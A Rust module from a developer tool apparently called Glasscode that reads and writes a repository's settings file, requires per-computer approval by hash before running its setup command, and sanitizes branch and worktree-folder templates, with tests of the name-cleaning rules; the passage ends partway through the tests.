//! A project's own settings: `.glasscode/settings.json` in its repository, so that everyone on
//! the project gets them. Four values: `setup` (a command for each new worktree),
//! `branch_template` and `worktree_folder` (how new branches and their folders are named), and
//! `default_agent`.
//!
//! The file comes with the repository, so a clone or a pull can bring a `setup` with it. Glasscode
//! therefore never runs it until the person approved that exact command on this computer
//! (`State.setup_approvals` keeps a SHA-256 of it for each project folder); a changed command asks
//! again. The templates are data, never commands: they are filled in with five named values only,
//! and the result is cleaned so that it is a valid branch, or a folder that stays under Glasscode's
//! worktree folder.
//!
//! The file is read with a size limit, and a broken one gives the defaults and one warning.

use std::io::Read as _;
use std::path::{Component, Path, PathBuf};
use std::sync::Mutex;

use serde_json::{Map, Value};
use sha2::{Digest, Sha256};

use crate::model::{AgentKind, SetupApproval};

/// The file, from the project's root.
pub const DIR: &str = ".glasscode";
pub const FILE_NAME: &str = "settings.json";
/// A larger file is not read.
pub const MAX_BYTES: u64 = 64 * 1024;
/// A longer setup command is not used.
pub const SETUP_MAX: usize = 2000;
/// The longest branch a template makes (cut at a character).
pub const BRANCH_MAX: usize = 100;
/// The longest folder name in a worktree folder, and the most folders in one.
pub const FOLDER_PART_MAX: usize = 80;
pub const FOLDER_DEPTH_MAX: usize = 4;
/// Where a new worktree goes without a template, under Glasscode's worktree folder.
pub const DEFAULT_FOLDER: &str = "{repo}/{branch}";
/// The names a template may use, as `{name}`.
pub const VARIABLES: [&str; 5] = ["repo", "branch", "issue", "type", "slug"];

/// The keys of the file, in the order a new file has them.
pub const KEYS: [&str; 4] = [
    "setup",
    "branch_template",
    "worktree_folder",
    "default_agent",
];

pub fn file(root: &Path) -> PathBuf {
    root.join(DIR).join(FILE_NAME)
}

/// The values of the file. None: not set (or not usable; then `Loaded.warnings` says why).
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct ProjectSettings {
    pub setup: Option<String>,
    pub branch_template: Option<String>,
    pub worktree_folder: Option<String>,
    pub default_agent: Option<AgentKind>,
}

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub enum FileState {
    /// The project has no file: Glasscode's defaults.
    #[default]
    Missing,
    Read,
    /// It could not be used at all: Glasscode's defaults, and one warning.
    Broken,
}

/// The file as one read found it.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Loaded {
    pub settings: ProjectSettings,
    pub state: FileState,
    /// What was wrong, once each, as the end of a sentence that starts with the file's name.
    pub warnings: Vec<String>,
}

fn broken(why: impl Into<String>) -> Loaded {
    Loaded {
        settings: ProjectSettings::default(),
        state: FileState::Broken,
        warnings: vec![why.into()],
    }
}

/// Read a project's file: never more than `MAX_BYTES`, never a panic.
pub fn load(root: &Path) -> Loaded {
    let path = file(root);
    let mut opened = match std::fs::File::open(&path) {
        Ok(f) => f,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Loaded::default(),
        Err(e) => {
            return broken(format!(
                "could not be read ({e}); Glasscode uses its defaults"
            ));
        }
    };
    let mut bytes = Vec::new();
    if let Err(e) = opened.by_ref().take(MAX_BYTES + 1).read_to_end(&mut bytes) {
        return broken(format!(
            "could not be read ({e}); Glasscode uses its defaults"
        ));
    }
    if bytes.len() as u64 > MAX_BYTES {
        return broken(format!(
            "is larger than {} KB, so it is not read; Glasscode uses its defaults",
            MAX_BYTES / 1024
        ));
    }
    match String::from_utf8(bytes) {
        Ok(text) => parse(&text),
        Err(_) => broken("is not UTF-8 text; Glasscode uses its defaults"),
    }
}

/// The file's text, as `load` reads it.
pub fn parse(text: &str) -> Loaded {
    let value: Value = match serde_json::from_str(text) {
        Ok(v) => v,
        Err(e) => {
            return broken(format!(
                "is not valid JSON (line {}, column {}); Glasscode uses its defaults",
                e.line(),
                e.column()
            ));
        }
    };
    let Value::Object(map) = value else {
        return broken("is not a JSON object ({ \"key\": value, … }); Glasscode uses its defaults");
    };
    let mut warnings = Vec::new();
    let setup =
        text_value(&map, "setup", &mut warnings).and_then(|s| usable_setup(s, &mut warnings));
    let branch_template = text_value(&map, "branch_template", &mut warnings);
    let worktree_folder = text_value(&map, "worktree_folder", &mut warnings);
    for (key, template) in [
        ("branch_template", &branch_template),
        ("worktree_folder", &worktree_folder),
    ] {
        let unknown = template
            .as_deref()
            .map(|t| expand(t, &Vars::default()).unknown)
            .unwrap_or_default();
        if !unknown.is_empty() {
            warnings.push(format!(
                "{key} uses {}, which Glasscode does not know (it knows {}); it stays as text",
                unknown
                    .iter()
                    .map(|u| format!("{{{u}}}"))
                    .collect::<Vec<_>>()
                    .join(", "),
                VARIABLES
                    .iter()
                    .map(|v| format!("{{{v}}}"))
                    .collect::<Vec<_>>()
                    .join(", ")
            ));
        }
    }
    let default_agent = text_value(&map, "default_agent", &mut warnings).and_then(|a| {
        let kind = agent_kind(&a);
        if kind.is_none() {
            warnings.push(format!(
                "default_agent “{a}” is not claude, codex or shell; it is ignored"
            ));
        }
        kind
    });
    Loaded {
        settings: ProjectSettings {
            setup,
            branch_template,
            worktree_folder,
            default_agent,
        },
        state: FileState::Read,
        warnings,
    }
}

/// A key's text: none when it is missing, null or empty; a warning when it is not text.
fn text_value(map: &Map<String, Value>, key: &str, warnings: &mut Vec<String>) -> Option<String> {
    match map.get(key) {
        None | Some(Value::Null) => None,
        Some(Value::String(s)) => Some(s.trim().to_string()).filter(|s| !s.is_empty()),
        Some(_) => {
            warnings.push(format!("{key} is not text; it is ignored"));
            None
        }
    }
}

fn agent_kind(word: &str) -> Option<AgentKind> {
    match word.trim().to_lowercase().as_str() {
        "claude" => Some(AgentKind::Claude),
        "codex" => Some(AgentKind::Codex),
        "shell" => Some(AgentKind::Shell),
        _ => None,
    }
}

/// The word the file has for an agent.
pub fn agent_word(agent: AgentKind) -> &'static str {
    match agent {
        AgentKind::Claude => "claude",
        AgentKind::Codex => "codex",
        AgentKind::Shell => "shell",
    }
}

/// The most spaces in a row a setup command may have: more could push the rest of it out of view.
pub const SETUP_SPACES_MAX: usize = 8;

/// A setup command that shows exactly as it runs: printable ASCII only (no line break, tab,
/// invisible, look-alike or combining character of any script), no long run of spaces, not too
/// long. An allowlist, so no character that Unicode adds later can hide part of the command.
fn usable_setup(setup: String, warnings: &mut Vec<String>) -> Option<String> {
    if setup.chars().count() > SETUP_MAX {
        warnings.push(format!("setup is longer than {SETUP_MAX} characters; it is ignored (call a script from it instead)"));
        return None;
    }
    if let Some((at, c)) = setup
        .chars()
        .enumerate()
        .find(|(_, c)| !(' '..='~').contains(c))
    {
        let what = match c {
            '\n' | '\r' | '\u{2028}' | '\u{2029}' => "a line break",
            '\t' => "a tab",
            _ => "a character that is not allowed",
        };
        warnings.push(format!(
            "setup has {what} (U+{:04X}, character {}); it is ignored, because only printable ASCII is allowed in it, so that what you approve is exactly what runs",
            c as u32,
            at + 1
        ));
        return None;
    }
    if setup.contains(&" ".repeat(SETUP_SPACES_MAX + 1)) {
        warnings.push(format!("setup has more than {SETUP_SPACES_MAX} spaces in a row, which could push the rest of the command out of view; it is ignored"));
        return None;
    }
    Some(setup)
}

/// The characters a branch or a folder from a template keeps: letters and digits of any script,
/// `-`, `_` and `.`. Anything else becomes `-`.
fn allowed_in_name(c: char) -> bool {
    c.is_alphanumeric() || matches!(c, '-' | '_' | '.')
}

// ----- writing ----------------------------------------------------------------------------------

/// Make the file with each key and an empty value, for the person to fill in. Never replaces a
/// file that exists.
pub fn create(root: &Path) -> anyhow::Result<PathBuf> {
    let path = file(root);
    if path.exists() {
        anyhow::bail!("{} exists already", path.display());
    }
    let mut map = Map::new();
    for key in KEYS {
        map.insert(key.into(), Value::String(String::new()));
    }
    write_map(root, &map)?;
    Ok(path)
}

/// Write `values` into the file: atomically (a new file, then a rename), keeping every key
/// already there that Glasscode does not know, in its place. None removes a key.
pub fn write(root: &Path, values: &ProjectSettings) -> anyhow::Result<()> {
    let path = file(root);
    let mut map = match std::fs::read_to_string(&path) {
        Ok(text) => match serde_json::from_str::<Value>(&text) {
            Ok(Value::Object(map)) => map,
            // Never write over a file that cannot be read back: it may be the person's edit.
            _ => anyhow::bail!(
                "{} is not a JSON object; fix it by hand first",
                path.display()
            ),
        },
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Map::new(),
        Err(e) => return Err(e.into()),
    };
    let text = |v: &Option<String>| v.clone().map(Value::String);
    for (key, value) in [
        ("setup", text(&values.setup)),
        ("branch_template", text(&values.branch_template)),
        ("worktree_folder", text(&values.worktree_folder)),
        (
            "default_agent",
            values
                .default_agent
                .map(|a| Value::String(agent_word(a).into())),
        ),
    ] {
        match value {
            Some(v) => {
                map.insert(key.into(), v);
            }
            None => {
                map.shift_remove(key);
            }
        }
    }
    write_map(root, &map)
}

fn write_map(root: &Path, map: &Map<String, Value>) -> anyhow::Result<()> {
    let path = file(root);
    let dir = root.join(DIR);
    std::fs::create_dir_all(&dir)?;
    let mut text = serde_json::to_string_pretty(map)?;
    text.push('\n');
    let mut tmp = tempfile::NamedTempFile::new_in(&dir)?;
    std::io::Write::write_all(&mut tmp, text.as_bytes())?;
    tmp.as_file().sync_all()?;
    tmp.persist(&path).map_err(|e| e.error)?;
    Ok(())
}

// ----- templates --------------------------------------------------------------------------------

/// The values a template is filled in with. An empty one is left out.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Vars {
    /// The project's name.
    pub repo: String,
    /// In a branch template: the name Glasscode gives the branch without one. In a worktree
    /// folder: the branch, as a folder name.
    pub branch: String,
    /// The ticket's identifier in lower case (`eng-826`, or `123` for a GitHub issue).
    pub issue: String,
    /// The kind of work: feat, fix, docs, refactor, test or chore.
    pub kind: String,
    /// A few words of the title, in lower case with hyphens.
    pub slug: String,
}

impl Vars {
    fn get(&self, name: &str) -> Option<&str> {
        Some(match name {
            "repo" => &self.repo,
            "branch" => &self.branch,
            "issue" => &self.issue,
            "type" => &self.kind,
            "slug" => &self.slug,
            _ => return None,
        })
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Expanded {
    pub text: String,
    /// Each `{name}` that is not one of `VARIABLES`, once, in order. It stays as text.
    pub unknown: Vec<String>,
}

/// Fill in a template in one pass: a value is never read as a template again, and an unknown
/// `{name}` stays as it is.
pub fn expand(template: &str, vars: &Vars) -> Expanded {
    let mut out = Expanded::default();
    let mut rest = template;
    while let Some(open) = rest.find('{') {
        out.text.push_str(&rest[..open]);
        let after = &rest[open + 1..];
        match after.find(['{', '}']) {
            Some(close) if after.as_bytes()[close] == b'}' => {
                let name = &after[..close];
                match vars.get(name) {
                    Some(value) => out.text.push_str(value),
                    None => {
                        out.text.push('{');
                        out.text.push_str(name);
                        out.text.push('}');
                        if !out.unknown.iter().any(|u| u == name) {
                            out.unknown.push(name.to_string());
                        }
                    }
                }
                rest = &after[close + 1..];
            }
            _ => {
                out.text.push('{');
                rest = after;
            }
        }
    }
    out.text.push_str(rest);
    out
}

/// Names Windows keeps for devices: a file or folder cannot have one, with or without an ending.
fn reserved(name: &str) -> bool {
    let stem = name
        .split('.')
        .next()
        .unwrap_or(name)
        .trim_end()
        .to_ascii_uppercase();
    matches!(
        stem.as_str(),
        "CON" | "PRN" | "AUX" | "NUL" | "CONIN$" | "CONOUT$"
    ) || (stem.len() == 4
        && (stem.starts_with("COM") || stem.starts_with("LPT"))
        && stem.as_bytes()[3].is_ascii_digit())
}

/// A branch from what a template made: only letters, digits, `-_./` stay (anything else becomes
/// `-`, so nothing that git or a Windows path refuses is left), no `..`, no part that starts with
/// `.` or `-` or ends with `.` or `.lock`, no device name, at most `BRANCH_MAX` characters. None
/// when nothing is left.
pub fn clean_branch(raw: &str) -> Option<String> {
    let mapped: String = raw
        .chars()
        .map(|c| {
            if allowed_in_name(c) || c == '/' {
                c
            } else {
                '-'
            }
        })
        .collect();
    let mut name = mapped;
    while name.contains("..") {
        name = name.replace("..", ".");
    }
    let mut name = name
        .split('/')
        .filter_map(clean_ref_part)
        .collect::<Vec<_>>()
        .join("/");
    if name.chars().count() > BRANCH_MAX {
        let cut: String = name.chars().take(BRANCH_MAX).collect();
        name = cut
            .split('/')
            .filter_map(clean_ref_part)
            .collect::<Vec<_>>()
            .join("/");
    }
    (!name.is_empty() && name != "@" && name != "HEAD").then_some(name)
}

/// One part of a branch, between slashes.
fn clean_ref_part(part: &str) -> Option<String> {
    let mut p = part.to_string();
    while p.contains("--") {
        p = p.replace("--", "-");
    }
    loop {
        let before = p.len();
        p = p
            .trim_start_matches(['.', '-'])
            .trim_end_matches(['.', '-'])
            .to_string();
        // `get`, not an index: the end may be inside a character of more than one byte.
        if p.len() >= 5
            && p.get(p.len() - 5..)
                .is_some_and(|end| end.eq_ignore_ascii_case(".lock"))
        {
            p.truncate(p.len() - 5);
        }
        if p.len() == before {
            break;
        }
    }
    if p.is_empty() {
        return None;
    }
    if reserved(&p) {
        p.push('_');
    }
    Some(p)
}

/// A folder, relative to Glasscode's worktree folder, from what a template made: `/` and `\`
/// separate folders; `.` and `..` are dropped, so it never leaves the worktree folder; a drive or
/// a leading separator cannot make it absolute (`:` is not kept); only letters, digits and `-_.`
/// stay in a folder's name (anything else becomes `-`, and a name of only `-` goes); no folder
/// ends with a dot or is a device name; at most `FOLDER_DEPTH_MAX` folders of `FOLDER_PART_MAX`
/// characters. None when nothing is left.
pub fn clean_folder(raw: &str) -> Option<PathBuf> {
    let mut out = PathBuf::new();
    let mut depth = 0;
    for part in raw.split(['/', '\\']) {
        let Some(part) = clean_folder_part(part) else {
            continue;
        };
        if depth == FOLDER_DEPTH_MAX {
            break;
        }
        out.push(part);
        depth += 1;
    }
    (depth > 0).then_some(out)
}

fn clean_folder_part(part: &str) -> Option<String> {
    let mut mapped: String = part
        .trim()
        .chars()
        .map(|c| if allowed_in_name(c) { c } else { '-' })
        .collect();
    while mapped.contains("--") {
        mapped = mapped.replace("--", "-");
    }
    if mapped.chars().all(|c| c == '-') {
        return None;
    }
    let mut p: String = mapped.trim_end_matches(['.', ' ']).to_string();
    if p.chars().count() > FOLDER_PART_MAX {
        p = p
            .chars()
            .take(FOLDER_PART_MAX)
            .collect::<String>()
            .trim_end_matches(['.', ' '])
            .to_string();
    }
    if p.is_empty() {
        return None;
    }
    if reserved(&p) {
        p.push('_');
    }
    Some(p)
}

/// Whether `rel` is a plain path below a folder: only names, no root, drive, `.` or `..`.
pub fn stays_below(rel: &Path) -> bool {
    rel.components().next().is_some() && rel.components().all(|c| matches!(c, Component::Normal(_)))
}

/// The values of a worktree folder template for a branch: the project and the branch as folder
/// names, and the issue, kind and words that the branch's name holds (`feat/eng-826-sync`).
pub fn folder_vars(project_name: &str, branch: &str) -> Vars {
    let last = branch.rsplit('/').next().unwrap_or(branch);
    Vars {
        repo: crate::git::slug(project_name),
        branch: crate::git::slug(branch),
        issue: crate::linear::identifiers_in(branch)
            .first()
            .map(|i| i.to_lowercase())
            .unwrap_or_default(),
        kind: branch
            .split_once('/')
            .map(|(kind, _)| kind.to_string())
            .unwrap_or_default(),
        slug: last.to_string(),
    }
}

/// The folder of a new worktree: `base` (Glasscode's worktree folder) and the project's template;
/// without a template, or when it leaves nothing, `<project>/<branch>` as before.
pub fn worktree_dir(
    base: &Path,
    project_name: &str,
    branch: &str,
    template: Option<&str>,
) -> PathBuf {
    let default = base
        .join(crate::git::slug(project_name))
        .join(crate::git::slug(branch));
    let Some(template) = template else {
        return default;
    };
    match clean_folder(&expand(template, &folder_vars(project_name, branch)).text) {
        Some(rel) if stays_below(&rel) => base.join(rel),
        _ => default,
    }
}

/// The first folder below the worktree folder that each new worktree of a project goes into
/// (`<project>` without a template, `app-wt` for `{repo}-wt/{branch}`), to tell which project a
/// folder that has no session any more belongs to. None when it changes with the branch.
pub fn first_folder(project_name: &str, template: Option<&str>) -> Option<String> {
    let base = Path::new("base");
    let first = |branch: &str| {
        worktree_dir(base, project_name, branch, template)
            .strip_prefix(base)
            .ok()?
            .components()
            .next()
            .map(|c| c.as_os_str().to_string_lossy().into_owned())
    };
    // Two branches that share nothing: a folder both go into does not come from the branch.
    let (a, b) = (first("a1"), first("b2/eng-3-c3"));
    (a == b).then_some(a).flatten()
}

/// What a new branch is named from: the ticket, else the title.
#[derive(Clone, Debug, Default)]
pub struct BranchFor<'a> {
    pub project_name: &'a str,
    /// The name Glasscode gives it without a template (`{branch}`).
    pub default: &'a str,
    /// The ticket's identifier (`ENG-826`, `#123`).
    pub issue: Option<&'a str>,
    /// The ticket's title, or the session's.
    pub title: Option<&'a str>,
    /// The ticket's labels (a "Bug" label makes `{type}` fix).
    pub labels: &'a [String],
}

/// A branch from the project's template. None when nothing tells this work apart (no ticket and
/// no title: Glasscode's placeholder is better) or the template leaves no valid name.
pub fn branch_name(template: &str, of: &BranchFor) -> Option<String> {
    let issue = of
        .issue
        .map(|i| i.trim().trim_start_matches('#').to_lowercase())
        .filter(|i| !i.is_empty());
    let slug = of.title.and_then(crate::naming::slug);
    if issue.is_none() && slug.is_none() {
        return None;
    }
    let vars = Vars {
        repo: crate::git::slug(of.project_name).to_lowercase(),
        branch: of.default.to_string(),
        issue: issue.unwrap_or_default(),
        kind: crate::naming::work_type(of.title.unwrap_or_default(), of.labels).to_string(),
        slug: slug.unwrap_or_default(),
    };
    clean_branch(&expand(template, &vars).text)
}

/// Where a value in effect comes from.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Source {
    /// The project's `.glasscode/settings.json`.
    Project,
    /// The person's own setting in Glasscode.
    Personal,
    /// Glasscode's own default.
    Glasscode,
}

/// The value in effect: the project's wins over the person's, which wins over Glasscode's.
pub fn in_effect<T>(project: Option<T>, personal: Option<T>, glasscode: T) -> (T, Source) {
    match (project, personal) {
        (Some(v), _) => (v, Source::Project),
        (None, Some(v)) => (v, Source::Personal),
        (None, None) => (glasscode, Source::Glasscode),
    }
}

// ----- the setup's approval ---------------------------------------------------------------------

/// The key of a project in `State.setup_approvals`: its folder.
pub fn approval_key(root: &Path) -> String {
    root.to_string_lossy().into_owned()
}

/// The most files of the worktree a setup's approval covers, and the largest one it reads.
pub const SETUP_FILES_MAX: usize = 8;
pub const SETUP_FILE_BYTES_MAX: u64 = 1024 * 1024;

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

/// A file of the new worktree that the setup command names, and the SHA-256 of its content.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SetupFile {
    /// From the worktree's root, with `/`.
    pub path: String,
    pub sha256: String,
}

/// What an approval covers: the command, and the files of the worktree that it names (a script
/// it runs). Files that those call in turn are not looked at.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct SetupCheck {
    pub command: String,
    pub files: Vec<SetupFile>,
    /// Words that name a file Glasscode does not read, and why (a link, outside the worktree,
    /// too large, more than `SETUP_FILES_MAX`).
    pub not_checked: Vec<(String, &'static str)>,
}

impl SetupCheck {
    /// What is kept of an approval: a SHA-256 of the command, each file's path and content hash,
    /// and the words that were not checked. An approval from before files were covered (the
    /// command alone) never matches, so it asks once more.
    pub fn fingerprint(&self) -> String {
        let mut hash = Sha256::new();
        hash.update(b"glasscode-setup-2\0");
        hash.update(self.command.as_bytes());
        for f in &self.files {
            hash.update(b"\0file\0");
            hash.update(f.path.as_bytes());
            hash.update(b"\0");
            hash.update(f.sha256.as_bytes());
        }
        for (word, why) in &self.not_checked {
            hash.update(b"\0unchecked\0");
            hash.update(word.as_bytes());
            hash.update(b"\0");
            hash.update(why.as_bytes());
        }
        hex(&hash.finalize())
    }
}

/// The words of a command as a shell splits them, roughly: spaces separate words, quotes keep
/// a word together, and `;`, `|`, `&`, `<`, `>`, `(` and `)` end one. A backslash stays a
/// character (a Windows path has them).
pub fn setup_words(command: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut word = String::new();
    let mut quote: Option<char> = None;
    for c in command.chars() {
        match quote {
            Some(q) if c == q => quote = None,
            Some(_) => word.push(c),
            None if c == '"' || c == '\'' => quote = Some(c),
            None if c.is_whitespace() || ";|&<>()".contains(c) => {
                if !word.is_empty() {
                    words.push(std::mem::take(&mut word));
                }
            }
            None => word.push(c),
        }
    }
    if !word.is_empty() {
        words.push(word);
    }
    words
}

/// Read what a setup's approval covers in the worktree at `root`: each word of the command that,
/// as a path from the root (also after `./` or `.\`), is a regular file inside it. A path through
/// a link, or one that leaves the worktree, is not followed; at most `SETUP_FILES_MAX` files of
/// `SETUP_FILE_BYTES_MAX` each are read. It reads files: call it in the background.
pub fn check_setup(root: &Path, command: &str) -> SetupCheck {
    let mut check = SetupCheck {
        command: command.to_string(),
        ..SetupCheck::default()
    };
    let real_root = root.canonicalize().ok();
    for word in setup_words(command) {
        let rel = word
            .strip_prefix("./")
            .or_else(|| word.strip_prefix(".\\"))
            .unwrap_or(&word);
        let shown = rel.replace('\\', "/");
        if check.files.iter().any(|f| f.path == shown)
            || check.not_checked.iter().any(|(w, _)| *w == shown)
        {
            continue;
        }
        let path = Path::new(rel);
        // A path that leaves the worktree (absolute, a drive, `..`) is not followed; one that
        // does not exist at all is not a file the command runs.
        let inside = path.components().next().is_some()
            && path.components().all(|c| matches!(c, Component::Normal(_)));
        if !inside {
            let named = if path.has_root() || path.is_absolute() {
                path.to_path_buf()
            } else {
                root.join(path)
            };
            if named.is_file() {
                check.not_checked.push((shown, "outside the worktree"));
            }
            continue;
        }
        match file_below(root, path) {
            Below::NotAFile => {}
            Below::Link => check.not_checked.push((shown, "a link")),
            Below::File(full) => {
                let real = full.canonicalize().ok();
                let outside = match (&real, &real_root) {
                    (Some(real), Some(root)) => !real.starts_with(root),
                    _ => true,
                };
                if outside {
                    check.not_checked.push((shown, "outside the worktree"));
                } else if check.files.len() == SETUP_FILES_MAX {
                    check
                        .not_checked
                        .push((shown, "more files than are checked"));
                } else {
                    match read_capped(&full) {
                        Some(bytes) => check.files.push(SetupFile {
                            path: shown,
                            sha256: hex(&Sha256::digest(&bytes)),
                        }),
                        None => check
                            .not_checked
                            .push((shown, "larger than 1 MB, or unreadable")),
                    }
                }
            }
        }
    }
    check
}

enum Below {
    NotAFile,
    Link,
    File(PathBuf),
}

/// `rel` below `root`, each part looked at without following it.
fn file_below(root: &Path, rel: &Path) -> Below {
    let mut at = root.to_path_buf();
    let parts: Vec<_> = rel.components().collect();
    for (i, part) in parts.iter().enumerate() {
        at.push(part);
        let Ok(meta) = std::fs::symlink_metadata(&at) else {
            return Below::NotAFile;
        };
        if crate::sys::is_link(&meta) {
            return Below::Link;
        }
        let last = i + 1 == parts.len();
        if (!last && !meta.is_dir()) || (last && !meta.is_file()) {
            return Below::NotAFile;
        }
    }
    Below::File(at)
}

/// A file's bytes, when it has at most `SETUP_FILE_BYTES_MAX`.
fn read_capped(path: &Path) -> Option<Vec<u8>> {
    let mut bytes = Vec::new();
    std::fs::File::open(path)
        .ok()?
        .take(SETUP_FILE_BYTES_MAX + 1)
        .read_to_end(&mut bytes)
        .ok()?;
    (bytes.len() as u64 <= SETUP_FILE_BYTES_MAX).then_some(bytes)
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Decision {
    /// This exact command and these files were approved: it runs.
    Run,
    /// Ask first. `changed`: something else was approved before (another command, another
    /// content of a file it runs, or an approval from before files were covered).
    Ask { changed: bool },
    /// "Never for this project".
    Never,
}

/// The answer for a setup whose check gave `fingerprint` (`SetupCheck::fingerprint`).
pub fn decide(approval: Option<&SetupApproval>, fingerprint: &str) -> Decision {
    match approval {
        Some(a) if a.never => Decision::Never,
        Some(SetupApproval {
            approved: Some(hash),
            ..
        }) if hash == fingerprint => Decision::Run,
        Some(SetupApproval {
            approved: Some(_), ..
        }) => Decision::Ask { changed: true },
        _ => Decision::Ask { changed: false },
    }
}

/// The approval of the setup whose check gave `fingerprint`.
pub fn approved(fingerprint: &str) -> SetupApproval {
    SetupApproval {
        approved: Some(fingerprint.to_string()),
        never: false,
    }
}

pub fn never() -> SetupApproval {
    SetupApproval {
        approved: None,
        never: true,
    }
}

// ----- new worktrees ----------------------------------------------------------------------------

/// A worktree this process made, with the project's file as it was read for it.
#[derive(Clone, Debug)]
pub struct NewWorktree {
    pub root: PathBuf,
    pub loaded: Loaded,
}

/// The worktrees `git::add_worktree` made that no session has started in yet: the first session
/// there runs (or asks about) the setup. Kept in memory only, so after a restart nothing runs.
static NEW_WORKTREES: Mutex<Vec<(PathBuf, NewWorktree)>> = Mutex::new(Vec::new());
/// The server's daemon makes worktrees too and never starts a terminal: keep only the newest.
const NEW_KEEP: usize = 32;

pub fn remember_new_worktree(path: &Path, root: &Path, loaded: Loaded) {
    let mut list = NEW_WORKTREES.lock().unwrap_or_else(|e| e.into_inner());
    list.retain(|(p, _)| p != path);
    list.push((
        path.to_path_buf(),
        NewWorktree {
            root: root.to_path_buf(),
            loaded,
        },
    ));
    if list.len() > NEW_KEEP {
        let extra = list.len() - NEW_KEEP;
        list.drain(..extra);
    }
}

/// The new worktree at `path`, once: the next call gives None.
pub fn take_new_worktree(path: &Path) -> Option<NewWorktree> {
    let mut list = NEW_WORKTREES.lock().unwrap_or_else(|e| e.into_inner());
    let index = list.iter().position(|(p, _)| p == path)?;
    Some(list.remove(index).1)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn vars() -> Vars {
        Vars {
            repo: "app".into(),
            branch: "eng-826-calendar-sync".into(),
            issue: "eng-826".into(),
            kind: "feat".into(),
            slug: "calendar-sync".into(),
        }
    }

    #[test]
    fn each_variable_is_filled_in() {
        let v = vars();
        for (template, expected) in [
            ("{repo}", "app"),
            ("{branch}", "eng-826-calendar-sync"),
            ("{issue}", "eng-826"),
            ("{type}", "feat"),
            ("{slug}", "calendar-sync"),
            ("{type}/{issue}-{slug}", "feat/eng-826-calendar-sync"),
            ("{repo}/{branch}", "app/eng-826-calendar-sync"),
            ("no variables", "no variables"),
        ] {
            assert_eq!(
                expand(template, &v),
                Expanded {
                    text: expected.into(),
                    unknown: vec![]
                },
                "{template}"
            );
        }
    }

    #[test]
    fn an_unknown_variable_stays_as_text_and_is_reported_once() {
        let e = expand("{ticket}/{slug}-{ticket}-{Repo}", &vars());
        assert_eq!(e.text, "{ticket}/calendar-sync-{ticket}-{Repo}");
        assert_eq!(e.unknown, vec!["ticket".to_string(), "Repo".to_string()]);
        // Braces that do not close are text too.
        assert_eq!(expand("a{b {repo} c}", &vars()).text, "a{b app c}");
        assert_eq!(expand("{", &vars()).text, "{");
        // The file reports it once, as one warning.
        let loaded = parse(r#"{ "branch_template": "{type}/{ticket}-{ticket}" }"#);
        assert_eq!(loaded.warnings.len(), 1, "{:?}", loaded.warnings);
        assert!(
            loaded.warnings[0].contains("{ticket}")
                && loaded.warnings[0].contains("branch_template")
        );
        assert_eq!(
            loaded.settings.branch_template.as_deref(),
            Some("{type}/{ticket}-{ticket}")
        );
    }

    /// A value from a ticket's title is data: a `{name}` in it is never filled in.
    #[test]
    fn a_value_is_never_read_as_a_template() {
        let v = Vars {
            slug: "{repo}".into(),
            ..vars()
        };
        assert_eq!(expand("{slug}", &v).text, "{repo}");
    }

    #[test]
    fn a_branch_has_no_character_that_git_or_windows_refuses() {
        for (raw, expected) in [
            (
                "feat/eng-826-calendar-sync",
                Some("feat/eng-826-calendar-sync"),
            ),
            ("feat/a b\tc", Some("feat/a-b-c")),
            ("feat/x~y^z:w?v*u[t\\s", Some("feat/x-y-z-w-v-u-t-s")),
            ("a<b>c\"d|e", Some("a-b-c-d-e")),
            ("feat/a..b", Some("feat/a.b")),
            ("feat/....b", Some("feat/b")),
            ("feat/x@{y}", Some("feat/x-y")),
            // Letters of other scripts stay; look-alike spaces, the soft hyphen, tags,
            // variation selectors and combining marks do not.
            ("feat/ü-é/日本", Some("feat/ü-é/日本")),
            (
                "feat/a\u{A0}b\u{3000}c\u{AD}d\u{E0041}e\u{FE0F}f\u{301}g",
                Some("feat/a-b-c-d-e-f-g"),
            ),
            ("-leading/-dash", Some("leading/dash")),
            ("feat/x.lock", Some("feat/x")),
            ("feat/x.LOCK.lock", Some("feat/x")),
            ("feat/.hidden", Some("feat/hidden")),
            ("feat/trailing.", Some("feat/trailing")),
            ("feat//double///slash/", Some("feat/double/slash")),
            ("/feat/", Some("feat")),
            ("con", Some("con_")),
            ("feat/COM1", Some("feat/COM1_")),
            ("feat/nul.txt", Some("feat/nul.txt_")),
            ("feat/a\u{7}b\u{202E}c", Some("feat/a-b-c")),
            ("@", None),
            ("HEAD", None),
            ("", None),
            ("..", None),
            ("/-/./", None),
            ("~^:", None),
        ] {
            assert_eq!(clean_branch(raw).as_deref(), expected, "{raw:?}");
        }
        let long = format!("feat/{}", "word-".repeat(40));
        let cut = clean_branch(&long).unwrap();
        assert!(
            cut.chars().count() <= BRANCH_MAX && !cut.ends_with('-'),
            "{cut}"
        );
        // A cut in the middle of a character of more than one byte.
        let wide = "ü".repeat(150);
        assert_eq!(clean_branch(&wide).unwrap().chars().count(), BRANCH_MAX);
    }

    /// Git itself agrees: each cleaned name passes `git check-ref-format --branch`.
    #[test]
    fn git_accepts_each_cleaned_branch() {
        let nasty = [
            "feat/eng-826 calendar",
            "a..b",
            "x@{1}",
            ".x/.y",
            "x.lock/y.lock",
            "-x",
            "a//b",
            "a/./b",
            "a/../b",
            "x~1^2:3",
            "?*[",
            "a\\b",
            "trailing.",
            "trailing/",
            "tab\there",
            "new\nline",
            "con/aux",
            "ü/é",
            "{unknown}/x",
            "a b/c d",
            "feat/-",
            "-/x",
            "@/x",
            "x/@",
            "HEAD/x",
        ];
        for raw in nasty {
            let Some(name) = clean_branch(raw) else {
                continue;
            };
            let out = crate::sys::command("git")
                .args(["check-ref-format", "--branch", &name])
                .output()
                .expect("git runs");
            assert!(
                out.status.success(),
                "{raw:?} became {name:?}, which git refuses: {}",
                String::from_utf8_lossy(&out.stderr)
            );
        }
    }

